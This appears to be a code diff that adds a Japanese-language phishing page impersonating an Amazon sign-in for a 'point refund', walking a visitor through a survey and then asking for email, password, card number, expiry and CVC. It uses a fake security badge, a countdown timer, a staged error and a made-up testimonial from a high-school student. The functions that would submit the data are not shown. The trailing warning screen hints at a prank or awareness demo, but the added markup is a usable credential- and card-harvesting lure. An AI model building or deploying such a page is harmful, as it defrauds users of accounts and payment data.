@@ -12,6 +12,83 @@
   
 </head>
 <body>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+  <div class="container">
+    <div id="step1" class="step">
+      <h1>Amazonアカウントに<br>サインイン</h1>
+      <p>【重要】ポイント還元手続きのお知らせ</p>
+      <p>以下の手順に従って、本人確認とポイント受取の準備を行ってください。</p>
+      <div class="fake-ssl">このページはセキュリティで保護されています</div>
+      <div class="countdown blink">残り時間：00:04:59</div>
+      <button type="button" class="amazon-button" onclick="showLoadingThenNext(2)">手続き開始</button>
+      <div class="footer">
+        <a href="#">アカウントを作成</a>・<a href="#">ヘルプ</a>
+      </div>
+    </div>
+
+    <div id="step2" class="step hidden">
+      <h1>アンケートにご協力ください</h1>
+      <p>以下の簡単な質問にお答えください。</p>
+      <label for="carrier">現在の携帯キャリア:</label>
+      <input type="text" id="carrier" name="carrier" required /><br>
+      <label for="usageYears">利用年数:</label>
+      <input type="text" id="usageYears" name="usageYears" required /><br>
+      <button type="button" class="amazon-button">次へ</button>
+      <div class="footer">
+        <a href="#">アカウントを作成</a>・<a href="#">ヘルプ</a>
+      </div>
+    </div>
+
+    <div id="step3" class="step hiddenn">
+      <h1>ログイン情報を確認</h1>
+      <label for="email">メールアドレスまたは携帯電話番号</label>
+      <input type="email" id="email" name="email" autocomplete="username" required />
+      <label for="password">パスワード</label>
+      <input type="password" id="password" name="password" autocomplete="current-password" required />
+      <div id="fake-error" class="hidden"></div>
+      <button type="button" class="amazon-button" onclick="submitLoginInfo()">送信</button>
+      <div class="footer">
+        <a href="#">アカウントを作成</a>・<a href="#">ヘルプ</a>
+      </div>
+    </div>
+
+    <div id="step4" class="step hiddenn">
+      <h1>クレジットカード情報を入力</h1>
+      <label for="cardNumber">カード番号:</label>
+      <input type="text" id="cardNumber" name="cardNumber" required /><br>
+      <label for="expiry">有効期限:</label>
+      <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required /><br>
+      <label for="cvc">CVC:</label>
+      <input type="text" id="cvc" name="cvc" required /><br>
+      <p id="cardError" class="hidden error">⚠️ 入力に誤りがあります</p>
+      <button type="button" class="amazon-button" onclick="validateCard()">送信</button>
+      <div class="footer">
+        <a href="#">アカウントを作成</a>・<a href="#">ヘルプ</a>
+      </div>
+    </div>
+
+    <div id="step5" class="step hiddenn">
+      <h1>手続きが完了しました</h1>
+      <p>ありがとうございました。</p>
+      <div class="testimonial">★★★★★ 「とても簡単で安心して利用できました」 - 高校2年 Mさん</div>
+      <div class="footer">
+        <a href="#">アカウントを作成</a>・<a href="#">ヘルプ</a>
+      </div>
+    </div>
+
+    <div id="loading" class="hiddenn loading-box">
+      <h2>🔄 情報を送信中です...</h2>
+      <div class="progress-bar"><div id="progress" class="progress-fill"></div></div>
+      <p id="loadingText">0%</p>
+      <p class="secure-msg">🔐 セキュア認証中...</p>
+    </div>
+  </div>
+
+  
+  
   <div id="AAA">
 <div class="warning-screen" id="warning-screen">
   <p class="loading" data-wa="* 心臓の弱い方、特に幼児・高齢者の方はご注意ください。">loding now,please wait.</p>
